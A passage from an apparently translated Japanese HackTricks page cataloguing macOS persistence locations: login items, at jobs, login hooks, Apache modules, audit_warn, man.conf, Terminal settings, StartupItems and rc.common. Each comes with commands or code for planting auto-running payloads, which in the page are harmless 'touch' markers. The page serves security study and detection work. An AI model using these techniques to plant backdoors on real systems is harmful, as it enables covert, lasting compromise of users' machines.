NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### **ログインアイテム**

解説: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

#### 場所

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **トリガー:** ログイン
* 悪意のあるペイロードは**`osascript`**を呼び出して保存されます
* TODO: ディスク上で直接実行する方法を見つける（あれば）
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **トリガー:** ログイン
* ルート権限が必要です

#### 説明

システム環境設定 -> ユーザーとグループ -> **ログインアイテム**には、**ユーザーがログインしたときに実行されるアイテム**があります。\
これらをコマンドラインからリストアップ、追加、削除することが可能です。
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
これらのアイテムは、ファイル**`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**に保存されます。

**ログインアイテム**は、API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc)を使用して指定することもできます。このAPIは設定を**`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**に保存します。

### ログインアイテムとしてのZIP

**ZIP**ファイルを**ログインアイテム**として保存すると、**`Archive Utility`**がそれを開きます。たとえば、ZIPが**`~/Library`**に保存され、バックドアを含む**`LaunchAgents/file.plist`**というフォルダがある場合、そのフォルダが作成され（デフォルトでは作成されません）、plistが追加されます。次回ユーザーがログインすると、plistで指定された**バックドアが実行されます**。

別のオプションとして、ユーザーのホームディレクトリに**`.bash_profile`**と**`.zshenv`**というファイルを作成することもできます。この場合、LaunchAgentsフォルダが既に存在している場合でも、このテクニックは機能します。

### At

解説: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

#### 場所

* **`at`**を**実行する**必要があり、**有効化**されている必要があります。

#### **説明**

「atタスク」は、**特定の時間にタスクをスケジュールする**ために使用されます。\
これらのタスクはcronと異なり、**一度だけ実行された後に削除**される**一時的なタスク**です。ただし、システムの再起動後も残るため、潜在的な脅威として排除することはできません。

**デフォルトでは**無効ですが、**root**ユーザーは次のコマンドで**有効化**できます:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
これにより、1時間後にファイルが作成されます。
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
`atq`コマンドを使用してジョブキューを確認します：
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
上記では、2つのスケジュールされたジョブが表示されています。`at -c JOBNUMBER`を使用して、ジョブの詳細を出力できます。
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
ATタスクが有効になっていない場合、作成されたタスクは実行されません。
{% endhint %}

**ジョブファイル**は`/private/var/at/jobs/`にあります。
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
ファイル名には、キュー、ジョブ番号、および実行予定時刻が含まれています。例えば、`a0001a019bdcd2`を見てみましょう。

* `a` - これはキューです
* `0001a` - 16進数でのジョブ番号、`0x1a = 26`
* `019bdcd2` - 16進数での時間。エポックから経過した分数を表します。`0x019bdcd2`は10進数で`26991826`です。これを60倍すると`1619509560`になります。これは`GMT: 2021年4月27日、火曜日7時46分00秒`です。

ジョブファイルを印刷すると、`at -c`を使用して得た情報と同じ情報が含まれていることがわかります。

### ログイン/ログアウトフック

**解説**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

#### 場所

* `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`のようなコマンドを実行できる必要があります。

これらは非推奨ですが、ユーザーがログインしたときにコマンドを実行するために使用することができます。
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
この設定は`/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`に保存されています。
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
削除するには：
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
ルートユーザーは**`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**に保存されます。

{% hint style="danger" %}
これは私にはうまくいきませんでした。ユーザーのLoginHookでもルートのLoginHookでもうまくいきませんでした。
{% endhint %}

### Apache2

**解説**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

#### 場所

* **`/etc/apache2/httpd.conf`**
* ルート権限が必要です
* トリガー: Apache2が起動したとき

#### 説明とエクスプロイト

/etc/apache2/httpd.confにモジュールを読み込むように指示するために、次のような行を追加できます:

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

この方法で、コンパイルされたモジュールはApacheによって読み込まれます。ただし、有効なApple証明書で署名するか、システムに新しい信頼できる証明書を追加してそれで署名する必要があります。

その後、サーバーが起動することを確認するために必要な場合は、次のコマンドを実行できます。
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylbのコード例：
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### Finder Sync プラグイン

**解説**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**解説**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

#### 場所

* 特定のアプリ

#### 説明と攻撃手法

Finder Sync 拡張機能を持つアプリケーションの例は、[**こちらで見つけることができます**](https://github.com/D00MFist/InSync)。

アプリケーションは `Finder Sync 拡張機能` を持つことができます。この拡張機能は、実行されるアプリケーションの内部に配置されます。さらに、拡張機能が自身のコードを実行できるようにするためには、**有効な Apple 開発者証明書で署名**されている必要があり、**サンドボックス化**されている必要があります（ただし、緩和された例外が追加される場合もあります）。また、次のようなものに登録されている必要があります:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### BSM監査フレームワーク

解説: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

#### 場所

* **`/etc/security/audit_warn`**
* ルート権限が必要
* **トリガー**: auditdが警告を検出した場合

#### 説明とエクスプロイト

auditdが警告を検出すると、スクリプト**`/etc/security/audit_warn`**が**実行**されます。したがって、ペイロードを追加することができます。
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
`sudo audit -n`を使用して警告を強制することができます。

### Man.conf

解説: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)

#### 位置

* **`/private/etc/man.conf`**
* ルート権限が必要
* **`/private/etc/man.conf`**: manが使用されるたびに

#### 説明と攻撃手法

設定ファイル**`/private/etc/man.conf`**は、manドキュメントファイルを開く際に使用するバイナリ/スクリプトを示しています。したがって、実行可能ファイルのパスを変更することで、ユーザーがmanを使用してドキュメントを読むたびにバックドアが実行される可能性があります。

例えば、**`/private/etc/man.conf`**に設定する:
```
MANPAGER /tmp/view
```
次に、`/tmp/view`を以下のように作成します：
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### ターミナル

**`~/Library/Preferences`** には、アプリケーションのユーザーの設定が保存されます。これらの設定の中には、他のアプリケーションやスクリプトを実行するための構成が含まれることがあります。

例えば、ターミナルは起動時にコマンドを実行することができます:

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

この設定は、**`~/Library/Preferences/com.apple.Terminal.plist`** ファイルに以下のように反映されます:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
したがって、システムのターミナルの設定のplistが上書きされると、**`open`**機能を使用して**ターミナルを開き、そのコマンドが実行されます**。

次のコマンドを使用して、cliからこれを追加できます：

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Emond

Appleは**emond**というログ記録メカニズムを導入しました。これは完全に開発されなかったようで、Appleは他のメカニズムのために開発を**放棄**した可能性がありますが、それでも**利用可能**です。

このあまり知られていないサービスは、Macの管理者には**あまり役に立たないかもしれません**が、脅威の存在する者にとっては、macOSの管理者がおそらく調べることのない**永続性のメカニズム**として使用するための非常に良い理由となります。emondの悪用を検出することは難しくありません。なぜなら、このサービスのためのシステムのLaunchDaemonは、スクリプトを実行する場所として**ただ1つの場所**を探します：
```bash
ls -l /private/var/db/emondClients
```
{% hint style="danger" %}
**あまり使用されていないため、そのフォルダ内のすべてのものは疑わしいものと見なすべきです**
{% endhint %}

### スタートアップアイテム

{% hint style="danger" %}
**これは非推奨ですので、以下のディレクトリには何も見つかるべきではありません。**
{% endhint %}

**StartupItem**は、次の2つのフォルダのいずれかに**配置**される**ディレクトリ**です。`/Library/StartupItems/`または`/System/Library/StartupItems/`

これらの2つの場所のいずれかに新しいディレクトリを配置した後、そのディレクトリ内に**2つのアイテム**をさらに配置する必要があります。これらの2つのアイテムは、**rcスクリプト**といくつかの設定を保持する**plist**です。このplistは「**StartupParameters.plist**」という名前である必要があります。

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% tab title="superservicename" %}スーパーサービス名
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### /etc/rc.common

{% hint style="danger" %}
**これは最新のMacOSバージョンでは機能しません**
{% endhint %}

ここには**起動時に実行されるコマンドを配置することもできます。** 通常のrc.commonスクリプトの例：
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
### プロファイル

設定プロファイルは、ユーザーに特定のブラウザの設定、DNSプロキシの設定、またはVPNの設定を使用させることができます。その他にも、悪用される可能性のある多くのペイロードが存在します。

次のコマンドを実行して、それらを列挙することができます。
```bash
ls -Rl /Library/Managed\ Preferences/
```
### その他の持続性の技術とツール

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
